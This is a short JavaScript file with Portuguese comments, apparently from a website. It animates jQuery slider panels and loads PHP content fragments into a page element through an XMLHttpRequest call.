function limparConteudo(div){
  if(div != ""){
	 document.getElementById(div).innerHTML = "<img src='Images/loading.gif' />";
  }
  $('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){});
  $('.divGaleriaSlider').animate({'marginLeft' : '375%'}, function(){});
}

function mostrarConteudoAJAX(conteudo, div){
	limparConteudo(div);
  
  if(conteudo == ""){
    $('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){});
  }else{  //TROCA CONTEUDO
  
    // CIMA
  	$('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){
  		// BAIXO
  		$('.divConteudoSlider').animate({'marginTop' : '0px'}, function(){
  			// CARREGA O CONTEUDO NA DIV VIA AJAX
  			carregarConteudoAJAX(conteudo,div);			
  		});
  	});
  }
}

function carregarConteudoAJAX(conteudo,div,parametros){

	var div_destino = document.getElementById(div);
  
  div_destino.innerHTML = "";

	createXMLHttp();
  
  if(parametros != ""){
    parametros = "?" + parametros;
  }
  
  //INCLUDE DE CONTEUDO
	http_request.open("GET", "inc_cont_" + conteudo + ".php" + parametros, true);
  
  //CHAMADA AJAX
	http_request.onreadystatechange=function() {
		if(http_request.readyState == 4){
			if(http_request.status == 200){

				div_destino.innerHTML = http_request.responseText;
        
        if(conteudo=='verGaleriaFloat'){                        
          loadSearchGaleria(); 
          fixCss(); 
        } 
			}
		}
	}
	http_request.send(null);
}
